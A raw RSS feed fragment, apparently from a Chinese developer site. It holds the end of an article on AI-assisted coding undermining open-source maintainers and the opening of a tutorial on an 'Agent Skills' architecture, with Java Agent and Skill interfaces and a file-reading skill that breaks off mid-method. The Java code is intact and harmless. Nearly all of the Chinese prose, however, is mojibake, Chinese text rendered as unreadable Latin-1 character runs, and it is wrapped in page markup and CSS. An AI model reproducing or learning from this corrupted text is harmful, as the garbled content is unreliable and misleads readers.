<p>"è®¡é‡æ¯ä¸ªå¼€æºåº“çš„ä½¿ç”¨é‡åœ¨æŠ€æœ¯ä¸Šå¾ˆç®€å•ï¼Œ"ä»–è¯´ã€‚"è¿™å¯ä»¥ä½œä¸ºæ”¶å…¥åˆ†äº«åè®®çš„åŸºç¡€ã€‚å°±åƒ Spotify æ ¹æ®æ’­æ”¾æ—¶é—´å‘è‰ºæœ¯å®¶ä»˜è´¹ä¸€æ ·ï¼Œå¼€æºå¼€å‘è€…å¯ä»¥æ ¹æ®å®é™…ä½¿ç”¨æƒ…å†µåˆ†äº«éƒ¨åˆ† LLM æ”¶å…¥ã€‚"</p>
<p>Flask çš„åˆ›é€ è€…ã€ç»éªŒä¸°å¯Œçš„å¼€æºå¼€å‘è€… Armin Ronacher åœ¨ç»™ The Register çš„ç”µå­é‚®ä»¶ä¸­è¡¨ç¤ºï¼Œè™½ç„¶ AI æ”¹å˜äº†å¼€æºï¼Œä½†ä»–ä¿ç•™åˆ¤æ–­ã€‚</p>
<p>"AI ç¡®å®æ­£åœ¨æ”¹å˜å¼€æºçš„å¾ˆå¤šåŠ¨æ€ï¼Œ"Ronacher è¯´ã€‚"ç‰¹åˆ«æ˜¯ï¼Œå®ƒä½¿ä»£ç æ›´ä¾¿å®œï¼Œå¹¶æ”¹å˜äº†ç›¸å…³çš„è®¡ç®—ã€‚å¼€æºç°åœ¨çœ‹åˆ°æ›´å¤šä½è´¨é‡çš„è´¡çŒ®ï¼Œä½†å¦ä¸€æ–¹é¢ï¼Œå®ƒå¯èƒ½ä¼šåŠ å¼ºä¸€äº›å…³é”®é¡¹ç›®ï¼Œåœ¨è¿™äº›é¡¹ç›®ä¸­ï¼Œä¿¡ä»»æ¥è‡ªæœ‰è‰¯å¥½è®°å½•çš„å¼ºå¤§ç»´æŠ¤è€…ã€‚"</p>
<p>"æˆ‘è®¤ä¸ºç°åœ¨è¯´è¿™å°†èµ°å‘ä½•æ–¹è¿˜ä¸ºæ—¶è¿‡æ—©ã€‚è¿™æ˜¯ä¸€ä¸ªå·¨å¤§çš„è½¬å˜ï¼Œæˆ‘ä»¬å°†åœ¨å‡ å¹´å†…çœ‹åˆ°æ•ˆæœã€‚è¿™å°†éœ€è¦ä¸€äº›é‡æ–°è°ƒæ•´ï¼Œåœ¨ä¸€åˆ‡å†æ¬¡ç¨³å®šä¹‹å‰ï¼Œå¾ˆéš¾å¾—å‡ºç»“è®ºã€‚"</p>
<p>"æ€»çš„æ¥è¯´ï¼Œæˆ‘ç°åœ¨ä¸ä¼šè¿‡å¤šè€ƒè™‘ä»»ä½•å±è¨€è€¸å¬çš„è¯´æ³•ã€‚åœ¨æ‰¾åˆ°æ–°å¸¸æ€ä¹‹å‰ï¼Œç›®å‰æŠ•å…¥å…ƒè®¨è®ºçš„æ‰€æœ‰ç²¾åŠ›ä¼¼ä¹éƒ½æ˜¯æµªè´¹ã€‚"</p>
<h2 data-id="heading-1">æ€»ç»“</h2>
<p>AI ç¼–ç¨‹å·¥å…·æ­£åœ¨æ”¹å˜è½¯ä»¶å¼€å‘çš„ç”Ÿæ€ï¼Œä½†åŒæ—¶ä¹Ÿå¯¹å¼€æºç¤¾åŒºå¸¦æ¥äº†å‰æ‰€æœªæœ‰çš„æŒ‘æˆ˜ã€‚å½“å¼€å‘è€…è¶Šæ¥è¶Šä¾èµ– AI æ¥ç”Ÿæˆä»£ç ï¼Œå¼€æºç»´æŠ¤è€…ä»¬æ­£åœ¨å¤±å»ä¸ç”¨æˆ·çš„è”ç³»ï¼Œè¿›è€Œå¤±å»äº†ä»–ä»¬çš„æ”¶å…¥æ¥æºå’Œç¤¾åŒºæ”¯æŒã€‚</p>
<p>è¿™ä¸ä»…ä»…æ˜¯ç»æµé—®é¢˜ï¼Œæ›´æ˜¯æ•´ä¸ªå¼€æºç”Ÿæ€ç³»ç»Ÿçš„ç”Ÿå­˜å±æœºã€‚æ­£å¦‚è®ºæ–‡æ‰€è­¦å‘Šçš„é‚£æ ·ï¼Œ"æ°›å›´ç¼–ç¨‹"å¯èƒ½æ­£åœ¨ä¸€æ­¥æ­¥æ‰¼æ€å¼€æºçš„æ ¹åŸºã€‚</p>
<p><strong>æ¬¢è¿å…³æ³¨å¾®ä¿¡å…¬ä¼—å·ï¼šå€”å¼ºé’é“œä¸‰ï¼Œè·å–æ›´å¤š AI å’ŒæŠ€æœ¯é¢†åŸŸçš„æ·±åº¦è§£è¯»ï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Agent Skillså·¥ä½œæµï¼šä»å…¥é—¨åˆ°å®æˆ˜]]></title>    <link>https://juejin.cn/post/7600994087588053011</link>    <guid>https://juejin.cn/post/7600994087588053011</guid>    <pubDate>2026-01-31T01:51:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600994087588053011" data-draft-id="7600986495927205929" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Agent Skillså·¥ä½œæµï¼šä»å…¥é—¨åˆ°å®æˆ˜"/> <meta itemprop="keywords" content="Java,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-31T01:51:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨ä¸­é£˜è¡çš„è®°å¿†"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Agent Skillså·¥ä½œæµï¼šä»å…¥é—¨åˆ°å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨ä¸­é£˜è¡çš„è®°å¿†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T01:51:22.000Z" title="Sat Jan 31 2026 01:51:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Agent Skillså·¥ä½œæµï¼šä»å…¥é—¨åˆ°å®æˆ˜</h2>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>åœ¨äººå·¥æ™ºèƒ½å¿«é€Ÿå‘å±•çš„ä»Šå¤©ï¼ŒAgentæ™ºèƒ½ä½“æŠ€æœ¯æ­£åœ¨æ”¹å˜æˆ‘ä»¬æ„å»ºåº”ç”¨çš„æ–¹å¼ã€‚Agent Skillså·¥ä½œæµä½œä¸ºè¿æ¥æ™ºèƒ½ä½“ä¸å…·ä½“èƒ½åŠ›çš„æ¡¥æ¢ï¼Œä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç§çµæ´»ã€å¯æ‰©å±•çš„æ¶æ„æ¨¡å¼ã€‚æœ¬æ–‡å°†ä»åŸºç¡€æ¦‚å¿µå‡ºå‘ï¼Œç»“åˆå®é™…æ¡ˆä¾‹ï¼Œå¸¦ä½ æ·±å…¥äº†è§£Agent Skillsçš„è®¾è®¡ä¸å®ç°ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c2bc2d2a5214350b58a5a623a9f951c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=iRvpk%2FUHq4gqhdUvRPQgam2Auqo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">ä¸€ã€ä»€ä¹ˆæ˜¯Agent Skills</h3>
<h4 data-id="heading-3">1.1 æ ¸å¿ƒæ¦‚å¿µ</h4>
<p><strong>Agentï¼ˆæ™ºèƒ½ä½“ï¼‰</strong>ï¼šå…·æœ‰è‡ªä¸»å†³ç­–èƒ½åŠ›çš„å®ä½“ï¼Œèƒ½å¤Ÿç†è§£ä»»åŠ¡ã€è§„åˆ’è¡ŒåŠ¨å¹¶æ‰§è¡Œæ“ä½œã€‚</p>
<p><strong>Skillï¼ˆæŠ€èƒ½ï¼‰</strong>ï¼šAgentå¯ä»¥è°ƒç”¨çš„å…·ä½“èƒ½åŠ›å•å…ƒï¼Œå¦‚æ–‡ä»¶è¯»å–ã€æ•°æ®æŸ¥è¯¢ã€æ–‡æœ¬åˆ†æç­‰ã€‚</p>
<p><strong>Agent Skillså·¥ä½œæµ</strong>ï¼šAgenté€šè¿‡è¯†åˆ«ä»»åŠ¡éœ€æ±‚ï¼ŒåŠ¨æ€é€‰æ‹©å¹¶è°ƒç”¨åˆé€‚çš„Skillï¼Œæœ€ç»ˆå®Œæˆç”¨æˆ·ç›®æ ‡çš„è¿‡ç¨‹ã€‚</p>
<h4 data-id="heading-4">1.2 æ¶æ„è®¾è®¡</h4>
<p>Agent Skillsæ¶æ„åŒ…å«å››ä¸ªæ ¸å¿ƒå±‚æ¬¡ï¼š</p>
<ul>
<li><strong>Agent Core</strong>ï¼šæ™ºèƒ½ä½“æ ¸å¿ƒï¼Œè´Ÿè´£å†³ç­–å’Œåè°ƒ</li>
<li><strong>Skill Registry</strong>ï¼šæŠ€èƒ½æ³¨å†Œä¸­å¿ƒï¼Œç®¡ç†æ‰€æœ‰å¯ç”¨æŠ€èƒ½</li>
<li><strong>Execution Engine</strong>ï¼šæ‰§è¡Œå¼•æ“ï¼Œå¤„ç†æŠ€èƒ½è°ƒç”¨å’Œé”™è¯¯é‡è¯•</li>
<li><strong>Skill Implementations</strong>ï¼šå…·ä½“æŠ€èƒ½å®ç°å±‚</li>
</ul>
<p>è¿™ç§åˆ†å±‚è®¾è®¡ç¡®ä¿äº†ç³»ç»Ÿçš„å¯æ‰©å±•æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
<h3 data-id="heading-5">äºŒã€æ ¸å¿ƒç»„ä»¶å®ç°</h3>
<h4 data-id="heading-6">2.1 Agentæ¥å£è®¾è®¡</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.agent;

<span class="hljs-keyword">import</span> com.example.skills.Skill;
<span class="hljs-keyword">import</span> com.example.skills.SkillResult;

<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * Agentæ™ºèƒ½ä½“æ¥å£
 * å®šä¹‰Agentçš„åŸºæœ¬è¡Œä¸ºå’Œèƒ½åŠ›
 * <span class="hljs-doctag">@version</span> 1.0.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Agent</span> {

    <span class="hljs-comment">/**
     * è·å–Agentåç§°
     */</span>
    String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * è·å–Agentæè¿°
     */</span>
    String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * æ‰§è¡Œä»»åŠ¡
     *
     * <span class="hljs-doctag">@param</span> task ä»»åŠ¡å†…å®¹
     * <span class="hljs-doctag">@param</span> context æ‰§è¡Œä¸Šä¸‹æ–‡
     * <span class="hljs-doctag">@return</span> æ‰§è¡Œç»“æœ
     */</span>
    AgentResult <span class="hljs-title function_">execute</span><span class="hljs-params">(String task, AgentContext context)</span>;

    <span class="hljs-comment">/**
     * æ³¨å†ŒæŠ€èƒ½
     *
     * <span class="hljs-doctag">@param</span> skill æŠ€èƒ½å®ä¾‹
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerSkill</span><span class="hljs-params">(Skill skill)</span>;

    <span class="hljs-comment">/**
     * è·å–å·²æ³¨å†Œçš„æ‰€æœ‰æŠ€èƒ½
     */</span>
    java.util.Collection&lt;Skill&gt; <span class="hljs-title function_">getSkills</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * Agentæ‰§è¡Œç»“æœ
     */</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentResult</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> success;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String message;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object data;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> executionTime;

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgentResult</span><span class="hljs-params">(<span class="hljs-type">boolean</span> success, String message, Object data, <span class="hljs-type">long</span> executionTime)</span> {
            <span class="hljs-built_in">this</span>.success = success;
            <span class="hljs-built_in">this</span>.message = message;
            <span class="hljs-built_in">this</span>.data = data;
            <span class="hljs-built_in">this</span>.executionTime = executionTime;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentResult <span class="hljs-title function_">success</span><span class="hljs-params">(String message, Object data)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentResult</span>(<span class="hljs-literal">true</span>, message, data, <span class="hljs-number">0</span>);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentResult <span class="hljs-title function_">success</span><span class="hljs-params">(String message, Object data, <span class="hljs-type">long</span> executionTime)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentResult</span>(<span class="hljs-literal">true</span>, message, data, executionTime);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentResult <span class="hljs-title function_">failure</span><span class="hljs-params">(String message)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentResult</span>(<span class="hljs-literal">false</span>, message, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSuccess</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> success;
        }

        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMessage</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> message;
        }

        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> data;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getExecutionTime</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> executionTime;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"AgentResult{"</span> +
                    <span class="hljs-string">"success="</span> + success +
                    <span class="hljs-string">", message='"</span> + message + <span class="hljs-string">'\''</span> +
                    <span class="hljs-string">", data="</span> + data +
                    <span class="hljs-string">", executionTime="</span> + executionTime + <span class="hljs-string">"ms"</span> +
                    <span class="hljs-string">'}'</span>;
        }
    }
}

</code></pre>
<p>Agentæ¥å£å®šä¹‰äº†æ™ºèƒ½ä½“çš„åŸºæœ¬è¡Œä¸ºï¼Œå…¶ä¸­æœ€å…³é”®çš„æ˜¯<code>execute</code>æ–¹æ³•ï¼Œå®ƒæ¥æ”¶ä»»åŠ¡å’Œä¸Šä¸‹æ–‡ï¼Œè¿”å›æ‰§è¡Œç»“æœã€‚</p>
<h4 data-id="heading-7">2.2 Skillæ¥å£è®¾è®¡</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.skills;

<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * SkillæŠ€èƒ½æ¥å£
 * å®šä¹‰Agentå¯ä»¥æ‰§è¡Œçš„å…·ä½“æŠ€èƒ½
 * <span class="hljs-doctag">@version</span> 1.0.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Skill</span> {

    <span class="hljs-comment">/**
     * è·å–æŠ€èƒ½åç§°
     */</span>
    String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * è·å–æŠ€èƒ½æè¿°
     */</span>
    String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * è·å–æŠ€èƒ½ç‰ˆæœ¬
     */</span>
    <span class="hljs-keyword">default</span> String <span class="hljs-title function_">getVersion</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"1.0.0"</span>;
    }

    <span class="hljs-comment">/**
     * åˆ¤æ–­æŠ€èƒ½æ˜¯å¦å¯ä»¥æ‰§è¡Œè¯¥ä»»åŠ¡
     *
     * <span class="hljs-doctag">@param</span> task ä»»åŠ¡å†…å®¹
     * <span class="hljs-doctag">@return</span> æ˜¯å¦å¯ä»¥æ‰§è¡Œ
     */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">canExecute</span><span class="hljs-params">(String task)</span>;

    <span class="hljs-comment">/**
     * æ‰§è¡ŒæŠ€èƒ½
     *
     * <span class="hljs-doctag">@param</span> task ä»»åŠ¡å†…å®¹
     * <span class="hljs-doctag">@param</span> parameters å‚æ•°
     * <span class="hljs-doctag">@return</span> æ‰§è¡Œç»“æœ
     */</span>
    SkillResult <span class="hljs-title function_">execute</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span>;

    <span class="hljs-comment">/**
     * è·å–æŠ€èƒ½çš„è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰
     * é»˜è®¤30ç§’
     */</span>
    <span class="hljs-keyword">default</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getTimeout</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">30000</span>;
    }

    <span class="hljs-comment">/**
     * æŠ€èƒ½æ‰§è¡Œå‰çš„éªŒè¯
     *
     * <span class="hljs-doctag">@param</span> task ä»»åŠ¡å†…å®¹
     * <span class="hljs-doctag">@param</span> parameters å‚æ•°
     * <span class="hljs-doctag">@return</span> éªŒè¯æ˜¯å¦é€šè¿‡
     */</span>
    <span class="hljs-keyword">default</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validate</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span> {
        <span class="hljs-keyword">return</span> task != <span class="hljs-literal">null</span> &amp;&amp; !task.trim().isEmpty();
    }

    <span class="hljs-comment">/**
     * æŠ€èƒ½æ‰§è¡Œåçš„æ¸…ç†
     */</span>
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanup</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// é»˜è®¤ä¸éœ€è¦æ¸…ç†</span>
    }
}

</code></pre>
<p>Skillæ¥å£é‡‡ç”¨ç­–ç•¥æ¨¡å¼ï¼Œæ¯ä¸ªæŠ€èƒ½å®ç°ç‹¬ç«‹çš„åŠŸèƒ½ï¼Œå¹¶é€šè¿‡<code>canExecute</code>æ–¹æ³•å£°æ˜è‡ªå·±èƒ½å¤„ç†å“ªäº›ä»»åŠ¡ã€‚</p>
<h4 data-id="heading-8">2.3 æŠ€èƒ½è°ƒç”¨æµç¨‹</h4>
<p>å®Œæ•´çš„æŠ€èƒ½è°ƒç”¨æµç¨‹åŒ…æ‹¬10ä¸ªæ­¥éª¤ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d81964197c964a8ead67b9ddf715333e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=Q01D015VgZmn1k5nK%2BasnAO%2BD6g%3D" alt="" loading="lazy"/></p>
<ol>
<li>æ¥æ”¶ç”¨æˆ·è¯·æ±‚</li>
<li>è§£æä»»åŠ¡æ„å›¾</li>
<li>åŒ¹é…å¯ç”¨æŠ€èƒ½</li>
<li>éªŒè¯æ‰§è¡Œæƒé™</li>
<li>å‡†å¤‡æ‰§è¡Œå‚æ•°</li>
<li>è°ƒç”¨æŠ€èƒ½æ¥å£</li>
<li>ç›‘æ§æ‰§è¡ŒçŠ¶æ€</li>
<li>å¤„ç†æ‰§è¡Œç»“æœ</li>
<li>è¿”å›å“åº”æ•°æ®</li>
<li>æ›´æ–°æ‰§è¡Œå†å²</li>
</ol>
<p>æ¯ä¸ªæ­¥éª¤éƒ½æœ‰å…¶ç‰¹å®šçš„èŒè´£ï¼Œç¡®ä¿ä»»åŠ¡èƒ½å¤Ÿå®‰å…¨ã€é«˜æ•ˆåœ°æ‰§è¡Œã€‚</p>
<h3 data-id="heading-9">ä¸‰ã€åŸºç¡€æŠ€èƒ½å®ç°</h3>
<h4 data-id="heading-10">3.1 æ–‡ä»¶è¯»å–æŠ€èƒ½</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.skills.impl;

<span class="hljs-keyword">import</span> com.example.skills.Skill;
<span class="hljs-keyword">import</span> com.example.skills.SkillResult;
<span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;
<span class="hljs-keyword">import</span> java.nio.file.Files;
<span class="hljs-keyword">import</span> java.nio.file.Path;
<span class="hljs-keyword">import</span> java.nio.file.Paths;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * æ–‡ä»¶è¯»å–æŠ€èƒ½
 * ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹
 * <span class="hljs-doctag">@version</span> 1.0.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileReadSkill</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Skill</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(FileReadSkill.class);

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"FileReadSkill"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"è¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹ï¼Œæ”¯æŒæ–‡æœ¬æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ç­‰"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canExecute</span><span class="hljs-params">(String task)</span> {
        <span class="hljs-keyword">if</span> (task == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-type">String</span> <span class="hljs-variable">lowerTask</span> <span class="hljs-operator">=</span> task.toLowerCase();
        <span class="hljs-keyword">return</span> lowerTask.contains(<span class="hljs-string">"æ–‡ä»¶"</span>) &amp;&amp;
